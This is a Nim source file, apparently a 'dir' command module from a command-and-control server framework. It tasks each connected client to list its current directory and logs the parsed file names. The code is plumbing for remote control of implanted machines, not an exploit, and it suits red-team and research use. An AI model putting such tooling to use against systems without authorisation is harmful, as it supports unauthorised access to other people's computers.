import ../prelude

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("dir")
    if not task.isNil(): 
      await task.awaitResponse()

      let parser = initParser()
      parser.setBuffer(cast[seq[byte]](task.output.data))
      
      for _ in 1..(parser.extractInt32()):
        infoLog parser.extractString(), false
      # infoLog task.output.data, false

let cmd*: Command = Command(
  execProc: execProc,
  name: "dir",
  argsLength: 0,
  usage: @["dir"],
  cliMode: @[ClientInteractMode],
  description: "List files in current directory",
  category: CCClientInteraction,
  requiresConnectedClient: true
)